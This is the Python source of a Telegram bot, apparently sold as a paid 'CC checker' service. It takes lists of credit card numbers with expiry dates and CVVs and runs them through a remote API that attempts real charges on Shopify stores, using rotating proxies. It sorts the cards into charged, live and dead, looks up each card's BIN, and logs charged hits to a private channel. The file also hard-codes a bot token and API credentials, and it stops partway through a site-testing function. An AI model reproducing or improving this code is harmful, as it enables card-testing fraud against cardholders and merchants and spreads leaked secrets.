from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime, timedelta

# ========== CONFIGURATION ==========
CHECKER_API_URL = 'https://autosh.up.railway.app/shopii'

API_ID = 33552520
API_HASH = 'd82affa92dd5a1dbaa3087aa19a732f2'
BOT_TOKEN = '8860585696:AAEJ2uLV2Dce9HFGhpNDNZFXfJrUqnSU3s4'

ADMIN_IDS = [7132150988]
PVT_CHANNEL_ID = -1002200268580  # YAHAN APNA PVT CHANNEL ID DALO (Logs channel - SIRF CHARGED HITS JAYENGE)

# Required channels to join
REQUIRED_CHATS = [
    {"link": "https://t.me/dududadadee", "id": None},
    {"link": "https://t.me/dududadadee", "id": None},
    {"link": "https://t.me/dududadadee", "id": None},
]

# Premium Plans with Credits
PLANS = {
    "trial": {"days": 1, "credits": 10000, "price": "2$", "name": "馃巵 TRIAL"},
    "bronze": {"days": 3, "credits": 20000, "price": "4$", "name": "馃 BRONZE"},
    "silver": {"days": 7, "credits": 40000, "price": "8$", "name": "馃 SILVER"},
    "gold": {"days": 14, "credits": 50000, "price": "12$", "name": "馃 GOLD"},
    "platinum": {"days": 24, "credits": 100000, "price": "22$", "name": "馃拵 PLATINUM"},
}

# File paths
PREMIUM_FILE = 'premium.json'
KEYS_FILE = 'keys.json'
CREDITS_FILE = 'credits.json'
CREDIT_KEYS_FILE = 'credit_keys.json'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
BANNED_FILE = 'banned.txt'
GROUP_SETTINGS_FILE = 'group_settings.json'
USER_PROXIES_FILE = 'user_proxies.json'
HIT_STATS_FILE = 'hit_stats.json'

# Site filter presets
SITE_FILTERS = {
    "all": {"name": "馃搵 All Sites", "min": 0, "max": 999999},
    "under5": {"name": "馃挵 Under $5", "min": 0, "max": 5},
    "under10": {"name": "馃挵 Under $10", "min": 0, "max": 10},
    "under15": {"name": "馃挵 Under $15", "min": 0, "max": 15},
    "under20": {"name": "馃挵 Under $20", "min": 0, "max": 20},
    "under30": {"name": "馃挵 Under $30", "min": 0, "max": 30},
}

PREMIUM_EMOJI_IDS = {
    "鉁�": "6267008582294705964", "馃枻": "5278396716658217092", "鉂�": "5778527486270770928",
    "馃悋": "6199501437387412202", "馃挸": "5927169041595634481", "馃攷": "5258396243666681152",
    "馃摑": "5956561916573782596", "馃寪": "4906943755644306322", "馃幆": "5287535694099536694",
    "馃": "5985780596268339498", "馃さ": "4949560993840629085", "馃挵": "5987880246865565644",
    "鈴革笍": "6001440193058444284", "鈻讹笍": "6285315214673975495", "馃洃": "5463131536461144809",
    "馃搳": "5931472654660800739", "馃摝": "6066395745139824604", "馃搵": "5956561916573782596",
    "馃攧": "5971837723676249096", "鈴�": "5215327832040811010", "馃殌": "6235302918967269680",
    "鈿狅笍": "5420323339723881652", "馃拵": "5807499888245612254",
}

def premium_emoji(text):
    if not text:
        return text
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

bot = TelegramClient('hexaxshchkrx_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
active_sessions = {}
ACTIVE_FILTER = "all"
REFERRAL_FILE = 'referrals.json'
RATE_LIMIT_SECONDS = 3       # seconds between /cc commands per user
CREDITS_LOW_THRESHOLD = 100  # warn user when credits drop below this
REFERRAL_REWARD = 200        # credits given for each successful referral

# Rate limit tracker: {user_id: last_command_time}
_rate_limit_cache = {}
# Active checker sessions per user: {user_id: True}
_user_active_sessions = {}

# ========== CREDITS SYSTEM ==========
def load_credits():
    if not os.path.exists(CREDITS_FILE):
        return {}
    try:
        with open(CREDITS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_credits(credits_data):
    try:
        with open(CREDITS_FILE, 'w', encoding='utf-8') as f:
            json.dump(credits_data, f, indent=4)
    except:
        pass

def get_user_credits(user_id):
    credits_data = load_credits()
    uid = str(user_id)
    if uid not in credits_data:
        credits_data[uid] = 0
        save_credits(credits_data)
        return 0
    return credits_data.get(uid, 0)

def add_credits(user_id, amount):
    credits_data = load_credits()
    uid = str(user_id)
    credits_data[uid] = credits_data.get(uid, 0) + amount
    save_credits(credits_data)
    return True

def remove_credits(user_id, amount):
    credits_data = load_credits()
    uid = str(user_id)
    current = credits_data.get(uid, 0)
    new_amount = max(0, current - amount)
    credits_data[uid] = new_amount
    save_credits(credits_data)
    return True

def deduct_credit(user_id):
    credits_data = load_credits()
    uid = str(user_id)
    current = credits_data.get(uid, 0)
    if current >= 1:
        credits_data[uid] = current - 1
        save_credits(credits_data)
        return True, credits_data[uid]
    return False, current

# ========== CREDIT KEYS SYSTEM ==========
def load_credit_keys():
    if not os.path.exists(CREDIT_KEYS_FILE):
        return {}
    try:
        with open(CREDIT_KEYS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_credit_keys(keys_data):
    try:
        with open(CREDIT_KEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(keys_data, f, indent=4)
    except:
        pass

def generate_credit_key(amount):
    import string
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    keys_data = load_credit_keys()
    keys_data[key] = {
        'credits': amount,
        'used': False,
        'created_at': datetime.now().isoformat()
    }
    save_credit_keys(keys_data)
    return key

def redeem_credit_key(key, user_id):
    keys_data = load_credit_keys()
    if key not in keys_data:
        return False, "Invalid credit key"
    if keys_data[key]['used']:
        return False, "Key already used"
    
    credits = keys_data[key]['credits']
    add_credits(user_id, credits)
    
    keys_data[key]['used'] = True
    keys_data[key]['used_by'] = user_id
    keys_data[key]['used_at'] = datetime.now().isoformat()
    save_credit_keys(keys_data)
    
    return True, credits

# ========== PREMIUM KEYS SYSTEM ==========
def load_keys():
    if not os.path.exists(KEYS_FILE):
        return {}
    try:
        with open(KEYS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_keys(keys_data):
    try:
        with open(KEYS_FILE, 'w', encoding='utf-8') as f:
            json.dump(keys_data, f, indent=4)
    except:
        pass

def generate_premium_key(plan_key, days, credits):
    import string
    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    keys_data = load_keys()
    keys_data[key] = {
        'type': 'premium',
        'plan': plan_key,
        'days': days,
        'credits': credits,
        'used': False,
        'created_at': datetime.now().isoformat()
    }
    save_keys(keys_data)
    return key

def load_premium_users():
    if not os.path.exists(PREMIUM_FILE):
        return {}
    try:
        with open(PREMIUM_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_premium_users(premium_data):
    try:
        with open(PREMIUM_FILE, 'w', encoding='utf-8') as f:
            json.dump(premium_data, f, indent=4)
    except:
        pass

def is_premium(user_id):
    premium_data = load_premium_users()
    user_data = premium_data.get(str(user_id))
    if not user_data:
        return False
    expiry = datetime.fromisoformat(user_data['expiry'])
    if datetime.now() > expiry:
        del premium_data[str(user_id)]
        save_premium_users(premium_data)
        return False
    return True

def get_user_plan_name(user_id):
    """Get user's plan name"""
    premium_data = load_premium_users()
    user_data = premium_data.get(str(user_id))
    if not user_data:
        return "FREE"
    plan_key = user_data.get('plan_key', '')
    if plan_key and plan_key in PLANS:
        return PLANS[plan_key]['name']
    return "CUSTOM"

def add_premium_user(user_id, plan_key, days, credits):
    premium_data = load_premium_users()
    expiry = datetime.now() + timedelta(days=days)
    premium_data[str(user_id)] = {
        'expiry': expiry.isoformat(),
        'added_at': datetime.now().isoformat(),
        'days': days,
        'credits': credits,
        'plan_key': plan_key
    }
    save_premium_users(premium_data)
    add_credits(user_id, credits)

def redeem_premium_key(key, user_id):
    keys_data = load_keys()
    if key not in keys_data:
        return False, "Invalid premium key"
    if keys_data[key]['used']:
        return False, "Key already used"
    if is_premium(user_id):
        return False, "You already have premium access"
    
    days = keys_data[key]['days']
    credits = keys_data[key]['credits']
    plan_key = keys_data[key]['plan']
    
    add_premium_user(user_id, plan_key, days, credits)
    
    keys_data[key]['used'] = True
    keys_data[key]['used_by'] = user_id
    keys_data[key]['used_at'] = datetime.now().isoformat()
    save_keys(keys_data)
    
    if plan_key == 'custom':
        return True, f"Redeemed custom premium: {days} days + {credits} credits!"
    else:
        return True, f"Redeemed {PLANS[plan_key]['name']} plan! {days} days + {credits} credits!"

# ========== RESOLVE CHAT IDs ==========
async def resolve_chat_ids():
    for chat in REQUIRED_CHATS:
        try:
            entity = await bot.get_entity(chat["link"])
            chat["id"] = entity.id
            print(f"Resolved: {chat['link']} -> {entity.id}")
        except Exception as e:
            print(f"Failed to resolve {chat['link']}: {e}")

# ========== CHECK IF USER JOINED ALL ==========
async def check_user_joined(user_id):
    missing_chats = []
    for chat in REQUIRED_CHATS:
        if chat["id"] is None:
            continue
        try:
            found = False
            async for p in bot.iter_participants(chat["id"]):
                if p.id == user_id:
                    found = True
                    break
            if not found:
                missing_chats.append(chat["link"])
        except:
            missing_chats.append(chat["link"])
    if missing_chats:
        return False, missing_chats
    return True, None

# ========== HELPER FUNCTIONS ==========
def is_admin(user_id):
    return user_id in ADMIN_IDS

def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def load_banned_users():
    return get_file_lines(BANNED_FILE)

def is_banned(user_id):
    banned = load_banned_users()
    return str(user_id) in banned

def ban_user(user_id):
    with open(BANNED_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{user_id}\n")

def unban_user(user_id):
    banned = load_banned_users()
    if str(user_id) in banned:
        banned.remove(str(user_id))
        with open(BANNED_FILE, 'w', encoding='utf-8') as f:
            for uid in banned:
                f.write(f"{uid}\n")

# ========== GROUP SETTINGS SYSTEM ==========
def load_group_settings():
    if not os.path.exists(GROUP_SETTINGS_FILE):
        return {}
    try:
        with open(GROUP_SETTINGS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_group_settings(settings_data):
    try:
        with open(GROUP_SETTINGS_FILE, 'w', encoding='utf-8') as f:
            json.dump(settings_data, f, indent=4)
    except:
        pass

def is_group_enabled(chat_id):
    settings = load_group_settings()
    return settings.get(str(chat_id), False)

def set_group_enabled(chat_id, enabled):
    settings = load_group_settings()
    settings[str(chat_id)] = enabled
    save_group_settings(settings)
    return True

# ========== USER PROXIES SYSTEM ==========
def load_user_proxies():
    if not os.path.exists(USER_PROXIES_FILE):
        return {}
    try:
        with open(USER_PROXIES_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_user_proxies(proxies_data):
    try:
        with open(USER_PROXIES_FILE, 'w', encoding='utf-8') as f:
            json.dump(proxies_data, f, indent=4)
    except:
        pass

def get_user_specific_proxies(user_id):
    proxies_data = load_user_proxies()
    return proxies_data.get(str(user_id), [])

def add_user_proxy(user_id, proxy):
    proxies_data = load_user_proxies()
    uid = str(user_id)
    if uid not in proxies_data:
        proxies_data[uid] = []
    if proxy not in proxies_data[uid]:
        proxies_data[uid].append(proxy)
        save_user_proxies(proxies_data)
        return True
    return False

def remove_user_proxy(user_id, proxy):
    proxies_data = load_user_proxies()
    uid = str(user_id)
    if uid in proxies_data and proxy in proxies_data[uid]:
        proxies_data[uid].remove(proxy)
        save_user_proxies(proxies_data)
        return True
    return False

def clear_user_proxies(user_id):
    proxies_data = load_user_proxies()
    uid = str(user_id)
    if uid in proxies_data and proxies_data[uid]:
        proxies_data[uid] = []
        save_user_proxies(proxies_data)
        return True
    return False


# ========== HIT STATS SYSTEM ==========
def load_hit_stats():
    if not os.path.exists(HIT_STATS_FILE):
        return {}
    try:
        with open(HIT_STATS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_hit_stats(data):
    try:
        with open(HIT_STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)
    except:
        pass

def record_hit(user_id, hit_type):
    """hit_type: 'charged' or 'approved'"""
    data = load_hit_stats()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {'charged': 0, 'approved': 0, 'dead': 0, 'total': 0}
    data[uid][hit_type] = data[uid].get(hit_type, 0) + 1
    data[uid]['total'] = data[uid].get('total', 0) + 1
    save_hit_stats(data)

def record_dead(user_id):
    data = load_hit_stats()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {'charged': 0, 'approved': 0, 'dead': 0, 'total': 0}
    data[uid]['dead'] = data[uid].get('dead', 0) + 1
    data[uid]['total'] = data[uid].get('total', 0) + 1
    save_hit_stats(data)


# ========== RATE LIMIT HELPER ==========
import time as _time_module

def check_rate_limit(user_id):
    """Returns (allowed, seconds_remaining)"""
    now = _time_module.time()
    last = _rate_limit_cache.get(user_id, 0)
    diff = now - last
    if diff < RATE_LIMIT_SECONDS:
        return False, round(RATE_LIMIT_SECONDS - diff, 1)
    _rate_limit_cache[user_id] = now
    return True, 0

# ========== REFERRAL SYSTEM ==========
def load_referrals():
    if not os.path.exists(REFERRAL_FILE):
        return {}
    try:
        with open(REFERRAL_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_referrals(data):
    try:
        with open(REFERRAL_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)
    except:
        pass

def get_referral_code(user_id):
    data = load_referrals()
    uid = str(user_id)
    if uid not in data:
        import string
        code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        data[uid] = {'code': code, 'referred': [], 'total_earned': 0}
        save_referrals(data)
    return data[uid]['code']

def process_referral(new_user_id, ref_code):
    """Returns (success, referrer_id)"""
    data = load_referrals()
    new_uid = str(new_user_id)
    # Check if already referred
    for uid, info in data.items():
        if new_uid in info.get('referred', []):
            return False, None
    # Find referrer
    for uid, info in data.items():
        if info.get('code') == ref_code and uid != new_uid:
            info['referred'].append(new_uid)
            info['total_earned'] = info.get('total_earned', 0) + REFERRAL_REWARD
            save_referrals(data)
            add_credits(int(uid), REFERRAL_REWARD)
            return True, int(uid)
    return False, None

# ========== CREDITS LOW WARNING ==========
async def check_credits_low(user_id):
    """Send warning if credits drop below threshold"""
    credits = get_user_credits(user_id)
    if 0 < credits < CREDITS_LOW_THRESHOLD:
        try:
            await bot.send_message(user_id, premium_emoji(
                f"鈿狅笍 <b>Low Credits Warning!</b>\n\n"
                f"馃挵 You only have <b>{credits} credits</b> remaining.\n"
                f"Use /redeemcredit KEY to add more credits.\n"
                f"Contact @Mydev1 to purchase credits."
            ), parse_mode='html')
        except:
            pass

def load_sites():
    global ACTIVE_FILTER
    all_sites = get_file_lines(SITES_FILE)
    if not all_sites:
        return []
    if ACTIVE_FILTER == "all":
        return all_sites
    return all_sites

def load_proxies():
    return get_file_lines(PROXY_FILE)

def add_site(site_url):
    sites = load_sites()
    if site_url in sites:
        return False, "Site already exists"
    with open(SITES_FILE, 'a', encoding='utf-8') as f:
        f.write(f"{site_url}\n")
    return True, "Site added successfully"

def add_sites_bulk(site_urls):
    current_sites = load_sites()
    added = []
    already = []
    for site in site_urls:
        if site not in current_sites:
            added.append(site)
        else:
            already.append(site)
    if added:
        with open(SITES_FILE, 'a', encoding='utf-8') as f:
            for site in added:
                f.write(f"{site}\n")
    return added, already

def remove_site(site_url):
    sites = load_sites()
    if site_url not in sites:
        return False, "Site not found"
    new_sites = [s for s in sites if s != site_url]
    with open(SITES_FILE, 'w', encoding='utf-8') as f:
        for site in new_sites:
            f.write(f"{site}\n")
    return True, "Site removed successfully"

# ========== SEND REAL-TIME HIT NOTIFICATION TO USER (FULL FORMAT WITH BIN) ==========
async def send_realtime_hit_to_user(user_id, hit_type, card, response_msg, gateway, price):
    """Send real-time hit notification to user - FULL FORMAT with BIN Info (same as single check)"""
    
    if hit_type == "CHARGED":
        status_emoji = "鉁�"
        status_text = "饾悅饾悺饾悮饾惈饾悹饾悶饾悵"
    else:
        status_emoji = "馃枻"
        status_text = "饾悑饾悽饾惎饾悶"
    
    # Get BIN Info
    bin_num = card.split('|')[0][:6]
    brand, bin_type, level, bank, country, flag = await get_bin_info(bin_num)
    
    
    
    message = f"""<b>馃挸 #饾悞饾悋饾悗饾悘饾悎饾悈饾悩 </b>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<b>馃攷饾悋饾悽饾惌 饾悈饾惃饾惍饾惂饾悵!</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>馃挸 Card: <code>{card}</code></blockquote>
<blockquote>馃摑 Response: {response_msg[:150]}</blockquote>
<blockquote>馃寪 饾悊饾悮饾惌饾悶饾惏饾悮饾惒: 馃枻 {gateway} | 馃挵 {price}</blockquote>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<b>馃攷饾悂饾悎饾悕 饾悎饾惂饾悷饾惃</b>
<pre>饾棔饾棞饾棥 饾棞饾椈饾棾饾椉: {brand} - {bin_type} - {level}
饾棔饾棶饾椈饾椄: {bank}
饾棖饾椉饾槀饾椈饾榿饾椏饾槅: {country} {flag}</pre>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>

馃 <b>Bot By: <a href="tg://user?id=7415233736">Buik100</a></b>"""
    
    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
    except Exception as e:
        print(f"Error sending hit to user: {e}")

# ========== PVT CHANNEL LOGS (ONLY CHARGED HITS, WITH PLAN NAME) ==========
async def send_log_to_channel(response_msg, gateway, price, username, user_id):
    """
    Send log to PVT channel - ONLY for CHARGED hits
    Shows user's plan name as well
    """
    header = " CHARGED HIT 鉁�"
    
    if username:
        user_display = username
    else:
        user_display = str(user_id)
    
    # Get user's plan name
    plan_name = get_user_plan_name(user_id)
    
    log_message = f"""<b>{header}</b>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<b>Response 鈹�</b> {response_msg[:100]}
<b>Gateway 鈹�</b> {gateway}
<b>Price 鈹�</b> {price}
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<b>User 鈹�</b> <a href="tg://user?id={user_id}">{user_display}</a> ({plan_name} USER)"""

    try:
        await bot.send_message(PVT_CHANNEL_ID, premium_emoji(log_message), parse_mode='html')
    except Exception as e:
        print(f"Error sending log to PVT channel: {e}")

# ========== SITE FILTER COMMAND ==========
@bot.on(events.NewMessage(pattern=r'^/filter(@\w+)?(\s+.*)?$'))
async def filter_command(event):
    global ACTIVE_FILTER
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("鉂� <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        filters_text = "\n".join([f"鈥� <code>/{key}</code> - {val['name']}" for key, val in SITE_FILTERS.items()])
        await event.reply(premium_emoji(f"<b>馃幆 Site Price Filters</b>\n\n{filters_text}\n\n<b>Current Filter:</b> {SITE_FILTERS[ACTIVE_FILTER]['name']}\n\n<b>Usage:</b> <code>/filter under10</code>"), parse_mode='html')
        return
    
    filter_key = args[1].lower()
    if filter_key not in SITE_FILTERS:
        await event.reply(premium_emoji(f"鉂� Invalid filter. Use: {', '.join(SITE_FILTERS.keys())}"), parse_mode='html')
        return
    
    ACTIVE_FILTER = filter_key
    await event.reply(premium_emoji(f"鉁� <b>Filter Updated!</b>\n\nNow using: {SITE_FILTERS[ACTIVE_FILTER]['name']}"), parse_mode='html')

# ========== EXISTING FUNCTIONS ==========
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'submit rejected:','handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail',
)

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                data = await res.json()
                brand = data.get('brand', '-')
                bin_type = data.get('type', '-')
                level = data.get('level', '-')
                bank = data.get('bank', '-')
                country = data.get('country_name', '-')
                flag = data.get('country_flag', '')
                return brand, bin_type, level, bank, country, flag
    except Exception:
        return '-', '-', '-', '-', '-', ''

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}

        params = {'cc': card, 'site': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=120)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        gate = raw.get('Gate', 'Shopify Payments')
        status = raw.get('Status', '')

        if is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        response_lower = response_msg.lower()

        if status == 'Charged' or 'order completed' in response_lower or '馃拵' in response_msg or 'order_placed' in response_lower or 'ORDER_PLACED' in response_msg:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif 'cloudflare bypass failed' in response_lower:
            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
        elif 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        elif status == 'Approved' or any(key in response_lower for key in [
            'approved', 'success', 'insufficient_funds', 'insufficient funds',
            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
            'incorrect_zip', 'incorrect zip'
        ]):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'retry': True}
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=2):
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
         return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = await check_card(card, site, proxy)

        if not result.get('retry'):
            return result

        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)

    if last_result:
        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def update_progress(user_id, message_id, results, current_attempt_count):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    
    remaining_credits = get_user_credits(user_id)

    progress_text = f"""<b>馃挸 Nomi 饾樉饾櫇饾櫄饾櫂饾櫊饾櫄饾櫑 </b>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<b>馃攷 饾悘饾惈饾惃饾悹饾惈饾悶饾惉饾惉</b>
<blockquote>馃挸 Total: {results['total']} | 鉁� Charged: {len(results['charged'])} | 馃枻 Live: {len(results['approved'])} | 鉂� Dead: {len(results['dead'])}</blockquote>
<blockquote>馃搳 Checked: {current_attempt_count}/{results['total']}</blockquote>
<blockquote>馃寪 饾悊饾悮饾惌饾悶饾惏饾悮饾惒: 馃枻 {gateway}</blockquote>
<blockquote>鈴憋笍 Time: {hours}h {minutes}m {seconds}s</blockquote>
<blockquote>馃挵 Credits Left: {remaining_credits}</blockquote>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>"""

    buttons = [
        [Button.inline("鈴革笍 Pause", b"pause"), Button.inline("鈻讹笍 Resume", b"resume")],
        [Button.inline("馃洃 Stop", b"stop")]
    ]

    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except:
        pass

async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f"鉁� <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f"馃枻 <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    
    remaining_credits = get_user_credits(user_id)

    summary = f"""<b>馃挸Nomi 饾樉饾櫇饾櫄饾櫂饾櫊饾櫄饾櫑 馃挸</b>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<b>馃攷 饾悜饾悶饾惉饾惍饾惀饾惌饾惉</b>
<blockquote>馃挸 Total: {results['total']} | 鉁� Charged: {len(results['charged'])} | 馃枻 Live: {len(results['approved'])} | 鉂� Dead: {len(results['dead'])}</blockquote>
<blockquote>馃寪 饾悊饾悮饾惌饾悶饾惏饾悮饾惒: 馃枻 {gateway}</blockquote>
<blockquote>鈴憋笍 Time: {hours}h {minutes}m {seconds}s</blockquote>
<blockquote>馃挵 Credits Left: {remaining_credits}</blockquote>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>
<b>馃幆 饾悋饾悽饾惌饾惉</b>
<blockquote>{hits_text}</blockquote>
<b>鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹佲攣鈹�</b>

馃 <b>Bot By: <a href="tg://user?id=7415233736">Mydev1</a></b>"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"shopiii_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n")
        await f.write("馃挸 CC CHECKER RESULTS 馃挸\n")
        await f.write("Format: CC | Gateway | Price | Message | Site\n")
        await f.write("=" * 70 + "\n\n")

        await f.write(f"鉁� CHARGED ({len(results['charged'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")

        await f.write(f"馃枻 APPROVED ({len(results['approved'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")

        await f.write(f"鉂� DEAD ({len(results['dead'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")

    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode='html')

    try:
        os.remove(filename)
    except:
        pass

async def test_site(site, proxy):
    test_card = "5154623245618097|03|2032|156"
    try:
        params = {'cc': test_card, 'site': site, 'proxy': proxy}
